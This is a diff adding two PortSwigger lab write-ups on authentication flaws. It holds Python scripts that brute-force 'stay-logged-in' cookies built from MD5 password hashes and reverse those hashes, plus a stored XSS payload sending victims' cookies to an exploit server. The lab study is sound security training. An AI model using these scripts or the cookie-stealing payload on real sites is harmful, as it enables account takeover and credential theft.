@@ -371,3 +371,155 @@ for i in range(0,10000):
 
 
 ------
+
+
+
+
+
+
+
+### [Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
+
+
+
+**Goal** : brute-force Carlos's cookie to gain access to his "My account" page.
+
+- go to the login page ,submit your valid credentials `wiener:peter`,intercept the request and send it to the repeater
+
+- you will notice that when you enter : 
+
+  - wrong credentials , it gives `Invalid username or password.`
+
+  - multiple wrong credentials , it gives `You have made too many incorrect login attempts. Please try again in 1 minute(s).`
+
+  - valid credentials , it redirects to ` /my-account` and generate cookie 
+
+```bash
+Cookie:session=isdKJGMsLZYPCEPtocVeA1; stayloggedin=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
+```
+
+<img src="./auth_img/auth8_1.png" style="zoom:80%;" />
+
+- notice that the value of `stayloggedin` is in base64 
+- decode it and you will get `wiener:51dc30ddc473d43a6011e9ebba6ca770 ` which is the `username : md5(password)`
+- to brute-force the cookie of `carlos` you need list of possible [passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) in md5 hash then encode them into base64 
+  you can use this python script to generate all possible `stayloggedin` values
+
+ 
+
+```python
+import hashlib
+import base64
+f= open('password.txt', 'r')
+lines = f.readlines()
+for line in lines:
+    result = hashlib.md5(line.rstrip('\n').encode())
+    stringToBase64 = "carlos:"+result.hexdigest()
+    stringToBase64_bytes = stringToBase64.encode("ascii")
+    base64_bytes = base64.b64encode(stringToBase64_bytes)
+    base64_string = base64_bytes.decode("ascii")
+    print(f"{base64_string}")
+f.close()
+```
+
+
+
+- Log out of your account.
+- Send the most recent `GET /my-account` request to Burp Intruder.
+- select the value of  `stayloggedin` and click `add §`
+- load the base64 values
+
+<img src="./auth_img/auth8_3.png" style="zoom:80%;" />
+
+
+
+- click `start attack` .
+- one of them will login with `carlos` account
+
+<img src="./auth_img/auth8_2.png" style="zoom:80%;" />
+
+
+
+- decode the base64, you will get value like `carlos:d0763edaa9d9bd2a9516280e9044d885`
+- decrypt the md5 hash or you can use this script to get the password from the passwords wordlist
+
+```python
+import hashlib
+f= open('password.txt', 'r')
+lines = f.readlines()
+for line in lines:
+    result = hashlib.md5(line.rstrip('\n').encode())
+    stringToBase64 = "carlos:"+result.hexdigest()
+    if(stringToBase64 == "carlos:d0763edaa9d9bd2a9516280e9044d885"):
+        print(line)
+f.close()
+```
+
+
+
+- login with `carlos` credentials
+
+
+
+------
+
+
+
+
+
+### [Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)
+
+**Goal** : obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.
+
+- go to the login page ,submit your valid credentials `wiener:peter`,intercept the request and send it to the repeater
+
+- you will notice that when you enter : 
+
+  - wrong credentials , it gives `Invalid username or password.`
+
+  - multiple wrong credentials , it gives `You have made too many incorrect login attempts. Please try again in 1 minute(s).`
+
+  - valid credentials , it redirects to ` /my-account` and generate cookie 
+
+  - ```bash
+    Cookie:session=7XJuc6GpisdrW8O;stayloggedin=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
+    ```
+
+- notice that the value of `stayloggedin` is in base64 
+
+- decode it and you will get `wiener:51dc30ddc473d43a6011e9ebba6ca770 ` which is the `username : md5(password)`
+
+- go to home then view post and write XSS payload in the comment (stored XSS)
+
+```html
+<script>document.location='https://your-own-server.web-security-academy.net/'+document.cookie</script>
+```
+
+
+
+- open access log of the exploit server and you will get `carlos`'s cookie
+
+![](./auth_img/auth9_1.png)
+
+
+
+```bash
+stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+```
+
+
+
+- decode the base64, you will get `carlos:26323c16d5f4dabff3bb136f2460a943`
+- decrypt the md5 hash using any tool ,( i used this website `https://www.md5online.org/md5-decrypt.html` ) and you will get `carlos` 's password 
+
+<img src="./auth_img/auth9_2.png" style="zoom:80%;" />
+
+- login with `carlos` credentials  `carlos : onceuponatime  ` and delete his account
+
+
+
+
+
+
+
+------
